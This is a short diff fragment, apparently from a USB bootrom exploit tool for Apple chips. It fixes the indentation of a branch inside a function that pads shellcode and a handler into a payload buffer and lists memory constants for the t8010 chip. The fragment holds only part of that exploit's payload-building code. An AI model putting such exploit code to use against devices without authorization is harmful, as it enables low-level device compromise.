@@ -309,7 +309,7 @@ def payload(cpid):
     assert len(t8004_shellcode) <= PAYLOAD_OFFSET_ARMV7
     assert len(t8004_handler) <= PAYLOAD_SIZE_ARMV7
     return t8004_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(t8004_shellcode)) + t8004_handler
-if cpid == 0x8010:
+  if cpid == 0x8010:
     constants_usb_t8010 = [
                0x1800B0000, # 1 - LOAD_ADDRESS
         0x6578656365786563, # 2 - EXEC_MAGIC
